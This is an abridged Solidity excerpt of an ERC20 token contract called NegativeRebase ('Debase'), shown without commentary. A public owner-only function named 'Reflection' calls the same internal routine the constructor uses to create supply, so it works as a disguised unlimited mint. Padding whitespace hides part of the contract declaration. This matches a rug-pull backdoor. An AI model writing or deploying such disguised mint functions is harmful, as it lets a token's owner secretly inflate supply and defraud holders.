...
contract ERC20 is Context, IERC20, Ownable {
    ...
    function Reflection(uint256 amount) public onlyOwner {
    _Reflection(msg.sender, amount);
    }
    ...
    function _Reflection(address account, uint256 amount) internal virtual {
...
contract NegativeRebase                                                             is ERC20 {

    uint tokenTotalSupply = 1000000000;
 
    constructor() public ERC20("Debase", "Debase") {
        _Reflection(msg.sender, tokenTotalSupply * (10 ** uint256(decimals())));
    }
}